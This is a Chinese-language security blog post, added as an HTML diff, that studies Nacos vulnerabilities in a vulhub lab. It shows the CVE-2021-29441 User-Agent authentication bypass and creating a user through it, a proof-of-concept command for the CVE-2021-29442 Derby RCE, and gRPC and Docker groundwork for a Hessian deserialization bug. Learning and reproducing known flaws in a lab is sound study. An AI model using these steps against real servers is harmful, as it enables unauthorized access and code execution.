@@ -1,0 +1,360 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Nacos漏洞学习 | clown</title><meta name="author" content="clown"><meta name="copyright" content="clown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言最近在看Java微服务相关的知识，那就顺便学一下Nacos相关的漏洞 简介NACOS的官网：https:&#x2F;&#x2F;nacos.io&#x2F; Nacos 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 未授权访问漏洞(CVE-2021-29441)影响版本 Nacos &lt;&#x3D; 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos漏洞学习">
+<meta property="og:url" content="https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="clown">
+<meta property="og:description" content="前言最近在看Java微服务相关的知识，那就顺便学一下Nacos相关的漏洞 简介NACOS的官网：https:&#x2F;&#x2F;nacos.io&#x2F; Nacos 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 未授权访问漏洞(CVE-2021-29441)影响版本 Nacos &lt;&#x3D; 2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.clown2024.cn/202407151814130.jpg">
+<meta property="article:published_time" content="2025-03-02T13:44:14.000Z">
+<meta property="article:modified_time" content="2025-03-31T09:47:07.388Z">
+<meta property="article:author" content="clown">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.clown2024.cn/202407151814130.jpg"><link rel="shortcut icon" href="http://cdn.clown2024.cn/202407151818951.jpeg"><link rel="canonical" href="https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nacos漏洞学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-31 17:47:07'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="clown" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">32</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://cdn.clown2024.cn/202407151814130.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.clown2024.cn/illust_37614504_20210816_090201.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Nacos漏洞学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-02T13:44:14.000Z" title="发表于 2025-03-02 21:44:14">2025-03-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-31T09:47:07.388Z" title="更新于 2025-03-31 17:47:07">2025-03-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Nacos漏洞学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看Java微服务相关的知识，那就顺便学一下Nacos相关的漏洞</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>NACOS的官网：<a target="_blank" rel="noopener" href="https://nacos.io/">https://nacos.io/</a></p>
+<p>Nacos 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p>
+<h1 id="未授权访问漏洞cve-2021-29441"><a href="#未授权访问漏洞-CVE-2021-29441" class="headerlink" title="未授权访问漏洞(CVE-2021-29441)"></a>未授权访问漏洞(CVE-2021-29441)</h1><p><strong>影响版本</strong></p>
+<p>Nacos &lt;&#x3D; 2.0.0-ALPHA.1或者&lt;&#x3D;1.4.0</p>
+<p><strong>漏洞详情</strong></p>
+<p>nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。</p>
+<p><strong>复现</strong></p>
+<p>这里直接用vulhub的环境即可</p>
+<p>访问nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9接口</p>
+<p><img src="https://cdn.clown2024.cn/image-20250308163045149.png" alt="image-20250308163045149"></p>
+<p>正常来说访问是403的，我们UA头加上Nacos-Server就可以绕过验证，此时就为200了</p>
+<p><img src="https://cdn.clown2024.cn/image-20250308163418761.png" alt="image-20250308163418761"></p>
+<p>此时我们可以POST访问nacos&#x2F;v1&#x2F;auth&#x2F;users接口，body为username&#x3D;clown&amp;password&#x3D;clown，添加一个新用户</p>
+<p><img src="https://cdn.clown2024.cn/image-20250308163614387.png" alt="image-20250308163614387"></p>
+<p>然后我们就可以直接用该用户去登录后台了</p>
+<p><img src="https://cdn.clown2024.cn/image-20250308163751992.png" alt="image-20250308163751992"></p>
+<p>可以看到我们的用户是添加成功了，回来的是用户名和加密密码</p>
+<h1 id="未授权接口命令执行漏洞cve-2021-29442"><a href="#未授权接口命令执行漏洞-CVE-2021-29442" class="headerlink" title="未授权接口命令执行漏洞(CVE-2021-29442)"></a>未授权接口命令执行漏洞(CVE-2021-29442)</h1><p><strong>影响版本</strong></p>
+<p>Nacos &lt; 1.4.1</p>
+<p><strong>漏洞详情</strong></p>
+<p>在Nacos 1.4.1之前的版本中，一些API端点（如<code>/nacos/v1/cs/ops/derby</code>）可以默认没有鉴权，可以被未经身份验证的用户公开访问。攻击者可以利用该漏洞执行任意Derby SQL语句和 Java 代码。</p>
+<p><strong>复现</strong></p>
+<p>访问一下&#x2F;nacos&#x2F;v1&#x2F;cs&#x2F;ops&#x2F;derby接口</p>
+<p><img src="https://cdn.clown2024.cn/image-20250308220533168.png" alt="image-20250308220533168"></p>
+<p>可以看到未鉴权</p>
+<p>Derby是用java编写的一个数据库，可以上传jar包rce，直接用vulhub的poc验证即可（原理先空着🥲）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python poc.py -t http://your-ip:8848 -c <span class="hljs-string">&quot;root&quot;</span>  <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20250308222525087.png" alt="image-20250308222525087"></p>
+<h1 id="raft-hessian反序列化"><a href="#Raft-Hessian反序列化" class="headerlink" title="Raft Hessian反序列化"></a>Raft Hessian反序列化</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>漏洞影响的范围是nacos的7848端口</p>
+<p>7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化</p>
+<p>Nacos 1.x在单机模式下默认不开放7848端口，故该情况通常不受此漏洞影响。然而，2.x版本无论单机或集群模式均默认开放7848端口。</p>
+<p>所以影响范围为：</p>
+<p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6 使用cluster集群模式运行<br>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3 任意模式启动均受到影响</p>
+<h2 id="前置知识了解"><a href="#前置知识了解" class="headerlink" title="前置知识了解"></a>前置知识了解</h2><h3 id="grpc-java"><a href="#grpc-java" class="headerlink" title="grpc-java"></a>grpc-java</h3><p>nacos的客户端和和server之间是通过HTTP来通信的，而集群节点间是以grpc来通信的，所以我们等会构造数据包的时候就是以grpc的形式</p>
+<p>grpc的使用可以参考一下官方文档：<a target="_blank" rel="noopener" href="https://grpc.io/docs/languages/java/generated-code/">https://grpc.io/docs/languages/java/generated-code/</a></p>
+<p>还有官方的代码仓库：<a target="_blank" rel="noopener" href="https://github.com/grpc/grpc-java">https://github.com/grpc/grpc-java</a></p>
+<p><strong>先添加依赖</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-protobuf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-stub<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--运行服务端需要--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>定义proto文件</strong></p>
+<p>在src&#x2F;main目录下创建proto目录，然后创建一个proto文件</p>
+<figure class="highlight protobuf"><table><tr><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">option</span> java_multiple_files = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">option</span> java_package = <span class="hljs-string">&quot;com.example.grpc.api&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>  <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20250329165534865.png" alt="image-20250329165534865"></p>
+<p><strong>生成代码</strong></p>
+<p>可以用Maven插件或者命令行工具生成</p>
+<p>插件的用法可以看官方文档：<a target="_blank" rel="noopener" href="https://grpc.io/docs/languages/java/generated-code/#codegen">https://grpc.io/docs/languages/java/generated-code/#codegen</a></p>
+<blockquote>
+<p>emmm这里我的插件依赖一直是红的，用不了</p>
+</blockquote>
+<p>这里还是用命令行的形式</p>
+<p>首先下载protobuf：<a target="_blank" rel="noopener" href="https://github.com/protocolbuffers/protobuf">https://github.com/protocolbuffers/protobuf</a></p>
+<p>然后下载插件：<a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/">https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/</a></p>
+<p>接下来进到我们的proto目录，然后将刚刚下载的grpc-java插件移到这里并重命名为<code>protoc-gen-grpc-java</code></p>
+<p><img src="https://cdn.clown2024.cn/image-20250329165727150.png" alt="image-20250329165727150"></p>
+<p>然后用下面命令生成代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">protoc --plugin=protoc-gen-grpc-java.exe --grpc-java_out=../java --java_out=../java helloworld.proto<br><span class="hljs-comment"># --plugin 指定 gRPC-Java 插件（需可执行文件）</span><br><span class="hljs-comment"># --grpc-java_out 输出 gRPC 服务代码到 ../java</span><br><span class="hljs-comment"># --java_out 输出普通 Java 消息类到 ../java</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里要注意一下protobuf的版本，我用比较新的版本生成的代码会有些依赖没有，换成比较低的23.2版本才行</p>
+</blockquote>
+<p><img src="https://cdn.clown2024.cn/image-20250329174707984.png" alt="image-20250329174707984"></p>
+<p>然后就是实现具体的代码</p>
+<p><strong>编写服务端实现代码</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.service;<br><br><span class="hljs-keyword">import</span> com.example.grpc.api.GreeterGrpc;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloReply;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloRequest;<br><span class="hljs-keyword">import</span> io.grpc.stub.StreamObserver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GreeterGrpc</span>.GreeterImplBase &#123;<br><br>    <span class="hljs-comment">// 实现方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloRequest request, StreamObserver&lt;HelloReply&gt; responseObserver)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> request.getName();<br>        <span class="hljs-type">HelloReply</span> <span class="hljs-variable">helloReply</span> <span class="hljs-operator">=</span> HelloReply.newBuilder().setMessage(<span class="hljs-string">&quot;Hello, &quot;</span>+name).build();<br>        responseObserver.onNext(helloReply);<br>        responseObserver.onCompleted();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><strong>运行服务</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.service;<br><br><span class="hljs-keyword">import</span> io.grpc.Server;<br><span class="hljs-keyword">import</span> io.grpc.ServerBuilder;<br><span class="hljs-comment">// 启动服务</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-type">Server</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> ServerBuilder.forPort(port).addService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GreeterService</span>()).build();<br>        server.start();<br><br>        System.out.println(<span class="hljs-string">&quot;Running...&quot;</span>);<br>        server.awaitTermination();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>实现客户端代码</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.example.grpc.api.GreeterGrpc;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloReply;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloRequest;<br><span class="hljs-keyword">import</span> io.grpc.Channel;<br><span class="hljs-keyword">import</span> io.grpc.ManagedChannelBuilder;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();<br>        GreeterGrpc.<span class="hljs-type">GreeterBlockingStub</span> <span class="hljs-variable">greeterBlockingStub</span> <span class="hljs-operator">=</span> GreeterGrpc.newBlockingStub(channel);<br>        <span class="hljs-type">HelloRequest</span> <span class="hljs-variable">helloRequest</span> <span class="hljs-operator">=</span> HelloRequest.newBuilder().setName(<span class="hljs-string">&quot;clown&quot;</span>).build();<br>        <span class="hljs-type">HelloReply</span> <span class="hljs-variable">helloReply</span> <span class="hljs-operator">=</span> greeterBlockingStub.sayHello(helloRequest);<br>        System.out.println(helloReply.getMessage());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20250329181930632.png" alt="image-20250329181930632"></p>
+<h3 id="jraft协议"><a href="#JRaft协议" class="headerlink" title="JRaft协议"></a>JRaft协议</h3><p>有关Raft算法的知识需要提前了解一下，Raft是一种常用于集群间数据同步的共识算法，JRaft是其java实现，这个就不在这里多介绍了，可以看一下官方文档：<a target="_blank" rel="noopener" href="https://www.sofastack.tech/projects/sofa-jraft/overview/">https://www.sofastack.tech/projects/sofa-jraft/overview/</a></p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里下载一个2.2.2版本的nacos：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.2.2">https://github.com/alibaba/nacos/releases/tag/2.2.2</a></p>
+<p>因为这里只需要启动单机模式即可验证，而且默认启动内嵌Derby数据库，可以写一个简单的docker来配置</p>
+<p>dockerfile文件</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> docker.xuanyuan.me/openjdk:<span class="hljs-number">8</span>u342-jre<br><br><span class="hljs-comment"># 复制归档文件并自动解压</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> nacos-server-2.2.2.tar.gz /root</span><br><br><span class="hljs-comment"># 安装网络和进程管理工具包，-y 表示自动确认所有安装提示</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span><br><span class="language-bash">    apt install net-tools procps -y</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root</span><br></code></pre></td></tr></table></figure>
+
+<p>docker-compose文件</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;3&#x27;</span><br><br>services:<br>  nacos:<br>    build: .<br>    container_name: nacos<br>    ports:<br>      - <span class="hljs-number">5005</span>:<span class="hljs-number">5005</span> <span class="hljs-comment"># 开启远程调试端口</span><br>      - <span class="hljs-number">7848</span>:<span class="hljs-number">7848</span> <span class="hljs-comment"># 开启JRaft端口</span><br>      - <span class="hljs-number">8848</span>:<span class="hljs-number">8848</span> <span class="hljs-comment"># nacos控制台端口</span><br>    environment:<br>      - JAVA_OPT=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> <span class="hljs-comment"># 开启远程调试的启动参数</span><br>    command: <br>      - /bin/sh<br>      - -c<br>      - |<br>        bash nacos/bin/startup.sh -m standalone<br>        tail -f nacos/logs/start.out<br></code></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>可以看一下修复的补丁：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/pull/10542/files">https://github.com/alibaba/nacos/pull/10542/files</a></p>
+<p>看修复的补丁我们也可以很明显地知道，他加了一个Hessian反序列化的白名单</p>
+<p><img src="https://cdn.clown2024.cn/image-20250328234639269.png" alt="image-20250328234639269"></p>
+<p>我们先找找他是在哪里进行的Hessian反序列化</p>
+<p>我们可以直接下载源码来看</p>
+<p><img src="https://cdn.clown2024.cn/image-20250328235032707.png" alt="image-20250328235032707"></p>
+<p>可以看到这里默认用的就是Hessian，<code>com.alibaba.nacos.consistency.SerializeFactory#getDefault</code> 序列化工厂类</p>
+<p>反序列化的地方也很容易知道</p>
+<p><img src="https://cdn.clown2024.cn/image-20250328235202888.png" alt="image-20250328235202888"></p>
+<p>可以看到有漏洞的版本没有任何过滤</p>
